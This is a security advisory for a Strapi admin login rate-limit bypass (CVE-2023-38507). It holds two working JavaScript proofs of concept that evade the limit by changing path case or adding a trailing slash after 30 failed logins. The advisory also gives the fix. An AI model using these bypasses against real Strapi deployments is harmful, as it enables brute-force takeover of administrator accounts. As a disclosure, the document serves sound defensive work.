# [H] Strapi Improper Rate Limiting vulnerability

## Summary
Severity: High
Advisory: GHSA-24q2-59hm-rh9r
CVE: CVE-2023-38507
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2023-09-13
Source: https://github.com/advisories/GHSA-24q2-59hm-rh9r
Type: github-advisory

## Affected
- npm: `@strapi/admin` — affected >=0 <4.12.1
- npm: `@strapi/plugin-users-permissions` — affected >=0 <4.12.1

## Details
### 1. Summary
There is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.

### 2. Details
It is possible to avoid this by modifying the rate-limited request path as follows.
1. Manipulating request paths to upper or lower case. (Pattern 1)
   - In this case, avoidance is possible with various patterns.
2. Add path slashes to the end of the request path. (Pattern 2)

### 3. PoC
Access the administrator's login screen (`/admin/auth/login`) and execute the following PoC on the browser's console screen.

#### Pattern 1 (uppercase and lowercase)
```js
// poc.js
(async () => {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i < 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/Login", {  // capitalize part of path
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
```

##### This PoC does the following:
1. Request 30 incorrect logins.
4. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)
5. Next, falsify the pathname of the request (**`/admin/Login`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)

#### Pattern 2 (trailing slash)
```js
// poc.js
(async () => {
  const data1 = {
    email: "admin@strapi.com",   // registered e-mail address
    password: "invalid_password",
  };
  const data2 = {
    email: "admin@strapi.com",
    password: "RyG5z-CE2-]*4e4",   // correct password
  };

  for (let i = 0; i < 30; i++) {
    await fetch("http://localhost:1337/admin/login", {
      method: "POST",
      body: JSON.stringify(data1),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }

  const res1 = await fetch("http://localhost:1337/admin/login", {
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res1.status + " " + res1.statusText);

  const res2 = await fetch("http://localhost:1337/admin/login/", {  // trailing slash
    method: "POST",
    body: JSON.stringify(data2),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(res2.status + " " + res2.statusText);
})();
```

##### This PoC does the following:
1. Request 30 incorrect logins.
2. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)
3. Next, falsify the pathname of the request (**`/admin/login/`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)



#### PoC Video
- [PoC Video](https://drive.google.com/file/d/1UHyt6UDpl28CXjltVJmqDvSEkkJIexiB/view?usp=share_link)

### 4. Impact
It is possible to bypass the rate limit of the login function of the admin screen. 
Therefore, the possibility of unauthorized login by login brute force attack increases.

### 5. Measures
Forcibly convert the request path used for rate limiting to upper case or lower case and judge it as the same path. (`ctx.request.path`)   
Also, remove any extra slashes in the request path.

https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31

### 6. References
- [OWASP: API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP: Denial of Service Cheat Sheet (Rate limiting)](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting)

## References
- https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r
- https://nvd.nist.gov/vuln/detail/CVE-2023-38507
- https://github.com/strapi/strapi
- https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31
- https://github.com/strapi/strapi/releases/tag/v4.12.1
